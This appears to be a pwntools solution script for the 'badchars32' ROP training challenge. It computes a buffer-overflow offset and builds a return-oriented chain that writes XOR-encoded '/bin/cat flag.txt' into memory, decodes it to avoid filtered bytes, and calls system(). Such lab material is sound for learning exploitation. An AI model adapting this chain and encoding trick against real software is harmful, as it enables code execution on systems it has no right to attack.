#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template badchars32
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('badchars32')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

context.log_level = 'debug'
io = process(exe.path)
io.sendline(cyclic(511))
io.wait()
core = io.corefile
stack = core.eip
info("stack: %#x", stack)
#pattern = core.read(stack, 4)
offset = cyclic_find(stack)
info("pattern: %r", stack)
info("offset:  %d", offset)

# CONSTANTS
system = 0x80487b7
pop_esi_edi = 0x8048899
mov_ptr_edi_esi = 0x8048893
xor_ptr_ebx_cl = 0x8048890
pop_ebx = 0x8048461
pop_ecx = 0x8048897

data_addr = 0x804a044
bin_cat_a = 0xd09d9691
bin_cat_b = 0xd09c6174
bin_cat_c = 0xdf996c61
bin_cat_d = 0x672e7478
bin_cat_e = 0x74000000

info("OPTION 1: Using /bin/cat flag.txt approach")
# NOTE: I specify endian="BIG" for the strings so I don't have 
# to reverse the bytes from the conversion tool
payload = fit({
    offset: [
        p32(pop_esi_edi),
        p32(bin_cat_a, endian="big"),
        p32(data_addr),
        p32(mov_ptr_edi_esi),

        p32(pop_esi_edi),
        p32(bin_cat_b, endian="big"),
        p32(data_addr+4),
        p32(mov_ptr_edi_esi),

        p32(pop_esi_edi),
        p32(bin_cat_c, endian="big"),
        p32(data_addr+8),
        p32(mov_ptr_edi_esi),

        p32(pop_esi_edi),
        p32(bin_cat_d, endian="big"),
        p32(data_addr+12),
        p32(mov_ptr_edi_esi),

        p32(pop_esi_edi),
        p32(bin_cat_e, endian="big"),
        p32(data_addr+16),
        p32(mov_ptr_edi_esi),

        p32(pop_ebx),
        p32(data_addr),
        p32(pop_ecx),
        p32(0xff),
        p32(xor_ptr_ebx_cl),

        p32(pop_ebx),
        p32(data_addr+1),
        p32(pop_ecx),
        p32(0xff),
        p32(xor_ptr_ebx_cl),

        p32(pop_ebx),
        p32(data_addr+2),
        p32(pop_ecx),
        p32(0xff),
        p32(xor_ptr_ebx_cl),

        p32(pop_ebx),
        p32(data_addr+3),
        p32(pop_ecx),
        p32(0xff),
        p32(xor_ptr_ebx_cl),

        p32(pop_ebx),
        p32(data_addr+4),
        p32(pop_ecx),
        p32(0xff),
        p32(xor_ptr_ebx_cl),

        p32(pop_ebx),
        p32(data_addr+5),
        p32(pop_ecx),
        p32(0xff),
        p32(xor_ptr_ebx_cl),

        p32(pop_ebx),
        p32(data_addr+8),
        p32(pop_ecx),
        p32(0xff),
        p32(xor_ptr_ebx_cl),

        p32(pop_ebx),
        p32(data_addr+9),
        p32(pop_ecx),
        p32(0xff),
        p32(xor_ptr_ebx_cl),

        p32(system),
        p32(data_addr)]
    })


with open('payload.dat', 'wb') as out_file:
    out_file.write(payload)

io = process(exe.path)
io.sendline(payload)
io.wait_for_close()
lines = io.recv().decode().split('\n')
flag = None
for line in lines:
    if 'flag' in line:
        flag = line
        break
success(flag)

